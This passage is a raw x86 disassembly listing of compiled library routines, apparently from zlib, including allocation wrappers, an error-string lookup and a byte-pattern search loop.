  40565a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  405660:	8b 04 b3             	mov    (%ebx,%esi,4),%eax
  405663:	83 c6 01             	add    $0x1,%esi
  405666:	89 04 24             	mov    %eax,(%esp)
  405669:	e8 9a 51 00 00       	call   0x40a808
  40566e:	39 fe                	cmp    %edi,%esi
  405670:	7e ee                	jle    0x405660
  405672:	89 1c 24             	mov    %ebx,(%esp)
  405675:	e8 8e 51 00 00       	call   0x40a808
  40567a:	83 c4 2c             	add    $0x2c,%esp
  40567d:	31 c0                	xor    %eax,%eax
  40567f:	5b                   	pop    %ebx
  405680:	5e                   	pop    %esi
  405681:	5f                   	pop    %edi
  405682:	5d                   	pop    %ebp
  405683:	c3                   	ret
  405684:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  405688:	c7 44 03 fc 00 00 00 	movl   $0x0,-0x4(%ebx,%eax,1)
  40568f:	00 
  405690:	83 c4 2c             	add    $0x2c,%esp
  405693:	89 d8                	mov    %ebx,%eax
  405695:	5b                   	pop    %ebx
  405696:	5e                   	pop    %esi
  405697:	5f                   	pop    %edi
  405698:	5d                   	pop    %ebp
  405699:	c3                   	ret
  40569a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4056a0:	83 ec 1c             	sub    $0x1c,%esp
  4056a3:	8b 44 24 24          	mov    0x24(%esp),%eax
  4056a7:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4056ae:	00 
  4056af:	89 44 24 04          	mov    %eax,0x4(%esp)
  4056b3:	8b 44 24 20          	mov    0x20(%esp),%eax
  4056b7:	89 04 24             	mov    %eax,(%esp)
  4056ba:	e8 31 ff ff ff       	call   0x4055f0
  4056bf:	83 c4 1c             	add    $0x1c,%esp
  4056c2:	c3                   	ret
  4056c3:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4056c9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4056d0:	83 ec 1c             	sub    $0x1c,%esp
  4056d3:	8b 44 24 24          	mov    0x24(%esp),%eax
  4056d7:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  4056de:	00 
  4056df:	89 44 24 04          	mov    %eax,0x4(%esp)
  4056e3:	8b 44 24 20          	mov    0x20(%esp),%eax
  4056e7:	89 04 24             	mov    %eax,(%esp)
  4056ea:	e8 01 ff ff ff       	call   0x4055f0
  4056ef:	83 c4 1c             	add    $0x1c,%esp
  4056f2:	c3                   	ret
  4056f3:	90                   	nop
  4056f4:	90                   	nop
  4056f5:	90                   	nop
  4056f6:	90                   	nop
  4056f7:	90                   	nop
  4056f8:	90                   	nop
  4056f9:	90                   	nop
  4056fa:	90                   	nop
  4056fb:	90                   	nop
  4056fc:	90                   	nop
  4056fd:	90                   	nop
  4056fe:	90                   	nop
  4056ff:	90                   	nop
  405700:	b8 c0 d4 40 00       	mov    $0x40d4c0,%eax
  405705:	c3                   	ret
  405706:	8d 76 00             	lea    0x0(%esi),%esi
  405709:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  405710:	b8 55 00 00 00       	mov    $0x55,%eax
  405715:	c3                   	ret
  405716:	8d 76 00             	lea    0x0(%esi),%esi
  405719:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  405720:	b8 02 00 00 00       	mov    $0x2,%eax
  405725:	2b 44 24 04          	sub    0x4(%esp),%eax
  405729:	8b 04 85 40 d5 40 00 	mov    0x40d540(,%eax,4),%eax
  405730:	c3                   	ret
  405731:	eb 0d                	jmp    0x405740
  405733:	90                   	nop
  405734:	90                   	nop
  405735:	90                   	nop
  405736:	90                   	nop
  405737:	90                   	nop
  405738:	90                   	nop
  405739:	90                   	nop
  40573a:	90                   	nop
  40573b:	90                   	nop
  40573c:	90                   	nop
  40573d:	90                   	nop
  40573e:	90                   	nop
  40573f:	90                   	nop
  405740:	8b 44 24 0c          	mov    0xc(%esp),%eax
  405744:	0f af 44 24 08       	imul   0x8(%esp),%eax
  405749:	89 44 24 04          	mov    %eax,0x4(%esp)
  40574d:	e9 6e 50 00 00       	jmp    0x40a7c0
  405752:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  405759:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  405760:	8b 44 24 08          	mov    0x8(%esp),%eax
  405764:	89 44 24 04          	mov    %eax,0x4(%esp)
  405768:	e9 9b 50 00 00       	jmp    0x40a808
  40576d:	90                   	nop
  40576e:	90                   	nop
  40576f:	90                   	nop
  405770:	55                   	push   %ebp
  405771:	57                   	push   %edi
  405772:	89 d5                	mov    %edx,%ebp
  405774:	56                   	push   %esi
  405775:	53                   	push   %ebx
  405776:	83 ec 08             	sub    $0x8,%esp
  405779:	8b 30                	mov    (%eax),%esi
  40577b:	89 44 24 04          	mov    %eax,0x4(%esp)
  40577f:	83 fe 03             	cmp    $0x3,%esi
  405782:	0f 96 c2             	setbe  %dl
  405785:	85 c9                	test   %ecx,%ecx
  405787:	0f 95 c0             	setne  %al
  40578a:	31 db                	xor    %ebx,%ebx
  40578c:	20 c2                	and    %al,%dl
  40578e:	88 54 24 03          	mov    %dl,0x3(%esp)
  405792:	74 4c                	je     0x4057e0
  405794:	bf 04 00 00 00       	mov    $0x4,%edi
  405799:	eb 1c                	jmp    0x4057b7
  40579b:	90                   	nop
  40579c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4057a0:	89 f8                	mov    %edi,%eax
  4057a2:	29 f0                	sub    %esi,%eax
  4057a4:	83 f8 03             	cmp    $0x3,%eax
  4057a7:	89 c6                	mov    %eax,%esi
  4057a9:	0f 96 c0             	setbe  %al
  4057ac:	83 c3 01             	add    $0x1,%ebx
  4057af:	84 c0                	test   %al,%al
  4057b1:	74 2d                	je     0x4057e0
  4057b3:	39 d9                	cmp    %ebx,%ecx
  4057b5:	76 29                	jbe    0x4057e0
  4057b7:	0f b6 54 1d 00       	movzbl 0x0(%ebp,%ebx,1),%edx
  4057bc:	83 fe 02             	cmp    $0x2,%esi
  4057bf:	19 c0                	sbb    %eax,%eax
  4057c1:	f7 d0                	not    %eax
  4057c3:	38 c2                	cmp    %al,%dl
  4057c5:	74 29                	je     0x4057f0
  4057c7:	84 d2                	test   %dl,%dl
  4057c9:	74 d5                	je     0x4057a0
  4057cb:	0f b6 44 24 03       	movzbl 0x3(%esp),%eax
  4057d0:	31 f6                	xor    %esi,%esi
  4057d2:	83 c3 01             	add    $0x1,%ebx
  4057d5:	84 c0                	test   %al,%al
  4057d7:	75 da                	jne    0x4057b3
  4057d9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4057e0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4057e4:	89 30                	mov    %esi,(%eax)
  4057e6:	83 c4 08             	add    $0x8,%esp
